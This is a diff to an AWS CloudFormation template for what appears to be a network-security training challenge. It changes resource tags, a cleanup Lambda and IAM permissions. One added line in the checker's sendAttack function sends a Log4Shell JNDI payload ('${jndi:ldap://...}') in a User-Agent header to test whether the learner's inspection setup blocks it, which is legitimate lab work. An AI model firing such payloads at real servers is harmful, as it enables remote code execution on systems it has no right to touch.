@@ -50,7 +50,7 @@ Resources:
       VpcId: !Ref VPCID
       Tags:
       - Key: Name
-        Value: IGW Ingress RouteTable
+        Value: Network Security IGW Ingress RouteTable
       - Key: "challenge"
         Value: "networksecurity"
   IGWRouteAssoc:
@@ -86,7 +86,7 @@ Resources:
       VpcId: !Ref VPCID
       Tags:
       - Key: Name
-        Value: Public RouteTable
+        Value: NetworkSecurity Public Protected RouteTable
       - Key: "challenge"
         Value: "networksecurity"
   PublicSubnetPublicRoute:
@@ -118,7 +118,7 @@ Resources:
       AvailabilityZone: !Ref AvailabilityZone
       Tags:
       - Key: Name
-        Value: NetworkSecurity-NSMS-Endpoint-Subnet
+        Value: NetworkSecurity-Inspection-Endpoint-Subnet
       - Key: "challenge"
         Value: "networksecurity"
       - Key: "endpoint"
@@ -136,7 +136,7 @@ Resources:
       VpcId: !Ref VPCID
       Tags:
       - Key: Name
-        Value: NSMS Endpoint RouteTable
+        Value: Network Security Inspection Endpoint RouteTable
       - Key: "challenge"
         Value: "networksecurity"
 
@@ -211,10 +211,10 @@ Resources:
           lambdac = boto3.client("lambda")
 
           def sendReq(server, timeout=2):
-              return curl("curl --connect-timeout {} {}".format(timeout, server).split(' '))
+              return curl("curl -m {} {}".format(timeout, server).split(' '))
 
           def sendAttack(server, timeout=2):
-              return curl("curl --connect-timeout {} -H 'User-Agent: sdvntyer' {}/api/v88".format(timeout, server).split(' '))
+              return curl("curl -m {} -H 'User-Agent: ${{jndi:ldap://10.0.51.1:13/a}}' {}/cmd.exe".format(timeout, server).split(' '))
               # return curl("curl --connect-timeout {} {}".format(timeout, server).split(' '))  
           def curl(cmd):
               # Returns True if was able to connect to server
@@ -222,7 +222,6 @@ Resources:
               try:
                   output = subprocess.run(cmd, stderr=subprocess.PIPE, check=False).stderr.decode().strip()
                   errcode = re.search(".*curl: \((\d+)\).*", output)
-                  print("server: {} / errcode: {}".format(server, errcode.group(1) if errcode else errcode))
                   if errcode is None:  # No error code means we were able to connect
                       return True
                   else:
@@ -239,6 +238,7 @@ Resources:
               attack = sendAttack(victim)
               if req is True and attack is False:
                   msg = "You've successfully blocked the vulnerability!"
+                  lambdac.invoke(FunctionName='NetworkSecurityCleanupLambda', InvocationType='Event', Payload="{}")
                   return True
               else:
                   msg = "Unfortunately attacks are still occurring against your servers! Make sure you check your configuration and perhaps re-read the instructions, and try again."
@@ -339,19 +339,20 @@ Resources:
             igwrtb = os.environ.get("IGWRTB")
             pubrtb = os.environ.get("PublicRTB")
             privrtb = os.environ.get("PrivateRTB")
-            deleteCft = os.environ.get("DELETE_ENDPOINT", "true").lower() == "true"
+            deleteCftEnv = os.environ.get("DELETE_ENDPOINT", "true").lower() == "true"
             clean(igwrtb)
             clean(pubrtb, [{"DestinationCidrBlock": "0.0.0.0/0", "GatewayId": igw}])
             clean(privrtb, [{"DestinationCidrBlock": "0.0.0.0/0", "NatGatewayId": nat}])
-            if deleteCft:
+            if deleteCftEnv:
               deleteCft()
 
           def clean(rtbarn, desired=[]):
             rtb = ec2r.RouteTable(rtbarn)
             for r in rtb.routes:
-              r.delete()
+              if(r.destination_cidr_block != "10.0.0.0/16"):
+                r.delete()
             for r in desired:
-              rtb.create_route(r)
+              rtb.create_route(**r)
 
           def deleteCft():
             cfts = cft.describe_stacks()
@@ -386,6 +387,7 @@ Resources:
             - logs:DescribeLogStreams
             - logs:CreateLogGroup
             - logs:CreateLogStream
+            - ec2:DescribeVpcEndpoints
             - ec2:DescribeRouteTables
             - cloudformation:DescribeStacks
             Effect: Allow
@@ -405,5 +407,12 @@ Resources:
             Effect: Allow
             Resource:
               - !Sub arn:${AWS::Partition}:cloudformation:${AWS::Region}:${AWS::AccountId}:stack/TM-NS-Endpoint-*/*
+          - Action:
+            - ec2:DeleteVpcEndpoints
+            Effect: Allow
+            Resource: "*"
+            Condition:
+              StringEquals:
+                ec2:ResourceTag/EndpointCreatedBy: "CloudOneNetworkSecurity"
           Version: 2012-10-17
         PolicyName: NetworkSecurity_CleanupLambdaRole
